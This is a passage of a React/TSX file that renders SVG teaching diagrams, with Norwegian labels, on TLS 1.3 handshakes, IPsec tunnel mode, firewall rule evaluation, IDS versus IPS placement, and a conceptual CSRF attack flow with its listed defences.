        uit.no
      </text>
      <text x={380} y={219} textAnchor="middle" className="fill-muted-foreground text-[7px]">
        sertifikat
      </text>

      <defs>
        <marker id="pk1" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>
    </svg>
  );
}

function TlsHandshakeSvg() {
  return (
    <svg viewBox="0 0 520 320" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        TLS 1.3 handshake (1-RTT)
      </text>
      {/* Lifelines */}
      <line x1={90} y1={30} x2={90} y2={310} className="stroke-border" strokeWidth={1} />
      <line x1={430} y1={30} x2={430} y2={310} className="stroke-border" strokeWidth={1} />
      <text x={90} y={42} textAnchor="middle" className="fill-foreground text-[10px] font-semibold">
        Klient
      </text>
      <text
        x={430}
        y={42}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        Server
      </text>

      {/* CH */}
      <line
        x1={90}
        y1={70}
        x2={430}
        y2={85}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#tls)"
      />
      <text x={260} y={68} textAnchor="middle" className="fill-foreground text-[9px]">
        ClientHello
      </text>
      <text x={260} y={80} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        nonce_c, supported_ciphers, ECDHE-share_c
      </text>

      {/* SH */}
      <line
        x1={430}
        y1={115}
        x2={90}
        y2={155}
        className="stroke-success"
        strokeWidth={1.5}
        markerEnd="url(#tls)"
      />
      <text x={260} y={113} textAnchor="middle" className="fill-foreground text-[9px]">
        ServerHello + EncryptedExtensions
      </text>
      <text x={260} y={125} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        nonce_s, valgt_cipher, ECDHE-share_s
      </text>
      <text x={260} y={137} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        Certificate, CertificateVerify (signering)
      </text>
      <text x={260} y={149} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        Finished (MAC over hele handshake-historikk)
      </text>

      {/* Compute master */}
      <rect
        x={20}
        y={170}
        width={140}
        height={36}
        rx={4}
        className="fill-amber-500/10 stroke-amber-500/60"
        strokeWidth={1}
      />
      <text x={90} y={184} textAnchor="middle" className="fill-foreground text-[9px]">
        avled master fra ECDHE
      </text>
      <text x={90} y={197} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        via HKDF
      </text>

      <rect
        x={360}
        y={170}
        width={140}
        height={36}
        rx={4}
        className="fill-amber-500/10 stroke-amber-500/60"
        strokeWidth={1}
      />
      <text x={430} y={184} textAnchor="middle" className="fill-foreground text-[9px]">
        samme master
      </text>
      <text x={430} y={197} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        → trafikk-nøkler
      </text>

      {/* Finished */}
      <line
        x1={90}
        y1={225}
        x2={430}
        y2={235}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#tls)"
      />
      <text x={260} y={223} textAnchor="middle" className="fill-foreground text-[9px]">
        Finished (MAC)
      </text>

      {/* App data */}
      <line
        x1={90}
        y1={265}
        x2={430}
        y2={275}
        className="stroke-success"
        strokeWidth={2}
        markerEnd="url(#tls)"
      />
      <text x={260} y={263} textAnchor="middle" className="fill-success text-[10px] font-semibold">
        Applikasjonsdata (AES-GCM)
      </text>

      <text x={260} y={300} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        ECDHE gir Forward Secrecy — server-nøkkel lekker = bare nye sesjoner i fare
      </text>

      <defs>
        <marker id="tls" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-current" />
        </marker>
      </defs>
    </svg>
  );
}

function IpsecTunnelSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        IPsec ESP tunnel-mode
      </text>

      {/* Original packet */}
      <rect
        x={30}
        y={45}
        width={130}
        height={40}
        rx={4}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1}
      />
      <text x={95} y={60} textAnchor="middle" className="fill-foreground text-[9px]">
        10.0.1.5 → 10.0.2.7
      </text>
      <text x={95} y={75} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        IP + TCP/UDP + data
      </text>

      <line
        x1={160}
        y1={65}
        x2={210}
        y2={120}
        className="stroke-foreground/40"
        strokeWidth={1.5}
        markerEnd="url(#ip1)"
      />
      <text x={180} y={92} className="fill-muted-foreground text-[8px]">
        krypter + pakk
      </text>

      {/* Tunnel encapsulated packet */}
      <rect
        x={210}
        y={110}
        width={300}
        height={50}
        rx={4}
        className="fill-success/10 stroke-success"
        strokeWidth={1.5}
      />
      <rect
        x={216}
        y={118}
        width={70}
        height={34}
        className="fill-amber-500/30 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={251} y={132} textAnchor="middle" className="fill-foreground text-[8px]">
        ny IP
      </text>
      <text x={251} y={146} textAnchor="middle" className="fill-muted-foreground text-[7px]">
        .5 → .9
      </text>
      <rect
        x={292}
        y={118}
        width={50}
        height={34}
        className="fill-destructive/30 stroke-destructive"
        strokeWidth={1}
      />
      <text x={317} y={138} textAnchor="middle" className="fill-foreground text-[8px]">
        ESP hdr
      </text>
      <rect
        x={348}
        y={118}
        width={120}
        height={34}
        className="fill-brand/40 stroke-brand"
        strokeWidth={1}
      />
      <text x={408} y={132} textAnchor="middle" className="fill-foreground text-[8px]">
        kryptert payload
      </text>
      <text x={408} y={146} textAnchor="middle" className="fill-muted-foreground text-[7px]">
        (original IP+data)
      </text>
      <rect
        x={474}
        y={118}
        width={32}
        height={34}
        className="fill-success/30 stroke-success"
        strokeWidth={1}
      />
      <text x={490} y={138} textAnchor="middle" className="fill-foreground text-[8px]">
        MAC
      </text>

      <text x={360} y={180} textAnchor="middle" className="fill-foreground text-[10px]">
        Internett ser bare gateway-til-gateway
      </text>
      <text x={360} y={195} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Interne adresser og innhold skjult
      </text>

      <text x={20} y={220} className="fill-muted-foreground text-[9px]">
        Oslo GW 198.51.100.5
      </text>
      <text x={420} y={220} className="fill-muted-foreground text-[9px]">
        Bergen GW 203.0.113.9
      </text>

      <defs>
        <marker id="ip1" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>
    </svg>
  );
}

function FirewallRulesSvg() {
  const rules = [
    {
      n: 1,
      txt: "allow tcp any → web:443",
      color: "fill-success/20",
      stroke: "stroke-success",
      hit: false,
    },
    {
      n: 2,
      txt: "allow tcp any → mail:25",
      color: "fill-success/20",
      stroke: "stroke-success",
      hit: true,
    },
    {
      n: 3,
      txt: "allow established",
      color: "fill-success/20",
      stroke: "stroke-success",
      hit: false,
    },
    {
      n: 4,
      txt: "deny any → any",
      color: "fill-destructive/20",
      stroke: "stroke-destructive",
      hit: false,
    },
  ];
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Pakkefilter — top-down evaluering
      </text>

      <rect
        x={20}
        y={40}
        width={130}
        height={30}
        rx={4}
        className="fill-brand/30 stroke-brand"
        strokeWidth={1.5}
      />
      <text x={85} y={58} textAnchor="middle" className="fill-foreground text-[9px]">
        Innkommende pakke
      </text>
      <text x={85} y={80} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        TCP → mail.com:25
      </text>

      <line
        x1={150}
        y1={55}
        x2={200}
        y2={55}
        className="stroke-foreground/40"
        strokeWidth={1.5}
        markerEnd="url(#fw)"
      />

      {rules.map((r, i) => (
        <g key={r.n}>
          <rect
            x={210}
            y={40 + i * 38}
            width={250}
            height={28}
            rx={3}
            className={`${r.color} ${r.stroke}`}
            strokeWidth={r.hit ? 2 : 1}
          />
          <text x={220} y={58 + i * 38} className="fill-foreground text-[9px] font-mono">
            #{r.n} {r.txt}
          </text>
          {r.hit && (
            <text x={475} y={58 + i * 38} className="fill-success text-[10px] font-semibold">
              ← MATCH
            </text>
          )}
        </g>
      ))}

      <text x={260} y={220} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Første match vinner. Regel 4 fanger alt som ikke ble eksplisitt tillatt.
      </text>

      <defs>
        <marker id="fw" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>
    </svg>
  );
}

function IdsIpsSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        IDS (passiv) vs IPS (in-line)
      </text>

      {/* IDS row */}
      <text x={20} y={55} className="fill-brand text-[10px] uppercase tracking-wider font-semibold">
        IDS
      </text>
      <line x1={70} y1={80} x2={460} y2={80} className="stroke-foreground/60" strokeWidth={2} />
      <rect x={50} y={70} width={20} height={20} className="fill-amber-500" />
      <rect x={460} y={70} width={20} height={20} className="fill-success" />
      <text x={60} y={108} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        internett
      </text>
      <text x={470} y={108} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        intern
      </text>

      <rect
        x={235}
        y={62}
        width={50}
        height={36}
        rx={3}
        className="fill-card stroke-brand"
        strokeWidth={1.5}
        strokeDasharray="2 2"
      />
      <text x={260} y={84} textAnchor="middle" className="fill-foreground text-[9px]">
        switch
      </text>

      <line
        x1={260}
        y1={98}
        x2={260}
        y2={115}
        className="stroke-brand/60"
        strokeWidth={1}
        strokeDasharray="2 2"
      />
      <rect
        x={210}
        y={115}
        width={100}
        height={30}
        rx={4}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1.5}
      />
      <text x={260} y={132} textAnchor="middle" className="fill-foreground text-[9px]">
        IDS (sniffer)
      </text>
      <line
        x1={310}
        y1={130}
        x2={360}
        y2={130}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#id)"
      />
      <text x={395} y={134} className="fill-muted-foreground text-[8px]">
        varsel
      </text>

      <text x={195} y={158} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        SPAN-port kopierer trafikken
      </text>

      {/* IPS row */}
      <text
        x={20}
        y={185}
        className="fill-destructive text-[10px] uppercase tracking-wider font-semibold"
      >
        IPS
      </text>
      <line x1={70} y1={210} x2={235} y2={210} className="stroke-foreground/60" strokeWidth={2} />
      <line x1={285} y1={210} x2={460} y2={210} className="stroke-foreground/60" strokeWidth={2} />
      <rect x={50} y={200} width={20} height={20} className="fill-amber-500" />
      <rect x={460} y={200} width={20} height={20} className="fill-success" />

      <rect
        x={235}
        y={200}
        width={50}
        height={20}
        rx={3}
        className="fill-destructive/20 stroke-destructive"
        strokeWidth={1.5}
      />
      <text x={260} y={214} textAnchor="middle" className="fill-foreground text-[9px]">
        IPS
      </text>
      <text x={260} y={232} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        drop / pass
      </text>

      <defs>
        <marker id="id" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>
    </svg>
  );
}

function CsrfSvg() {
  return (
    <svg viewBox="0 0 520 260" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        CSRF — kryss-forespørsels-forfalskning
      </text>

      {/* Offer */}
      <rect
        x={20}
        y={40}
        width={90}
        height={50}
        rx={5}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1.5}
      />
      <text x={65} y={60} textAnchor="middle" className="fill-foreground text-[10px] font-semibold">
        offer
      </text>
      <text x={65} y={75} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        nettleser
      </text>
      <text x={65} y={86} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        cookie@bank
      </text>

      {/* Bank */}
      <rect
        x={410}
        y={40}
        width={90}
        height={50}
        rx={5}
        className="fill-success/20 stroke-success"
        strokeWidth={1.5}
      />
      <text
        x={455}
        y={60}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        bank.no
      </text>
      <text x={455} y={75} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        /overforing
      </text>

      <line
        x1={110}
        y1={60}
        x2={410}
        y2={60}
        className="stroke-success"
        strokeWidth={1.5}
        markerEnd="url(#cs)"
      />
      <text x={260} y={55} textAnchor="middle" className="fill-foreground text-[9px]">
        1. logger inn → får cookie
      </text>

      {/* Evil */}
      <rect
        x={210}
        y={130}
        width={100}
        height={40}
        rx={5}
        className="fill-destructive/20 stroke-destructive"
        strokeWidth={1.5}
      />
      <text
        x={260}
        y={148}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        evil.com
      </text>
      <text x={260} y={162} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        skjult POST-form
      </text>

      <line
        x1={65}
        y1={90}
        x2={215}
        y2={140}
        className="stroke-foreground/40"
        strokeWidth={1.2}
        markerEnd="url(#cs)"
      />
      <text x={130} y={120} className="fill-muted-foreground text-[8px]">
        2. besøker
      </text>

      <line
        x1={260}
        y1={170}
        x2={260}
        y2={195}
        className="stroke-destructive"
        strokeWidth={1.5}
        markerEnd="url(#cs)"
      />
      <text x={325} y={185} className="fill-foreground text-[9px]">
        3. siden POST-er til bank
      </text>

      <line
        x1={310}
        y1={210}
        x2={410}
        y2={85}
        className="stroke-destructive"
        strokeWidth={1.5}
        markerEnd="url(#cs)"
      />
      <text x={330} y={235} className="fill-destructive text-[9px]">
        + offerets cookie automatisk
      </text>

      <text x={260} y={252} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Forsvar: CSRF-token, SameSite-cookies, Origin-sjekk
      </text>

      <defs>
        <marker id="cs" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-current" />
        </marker>
      </defs>
    </svg>
  );
}
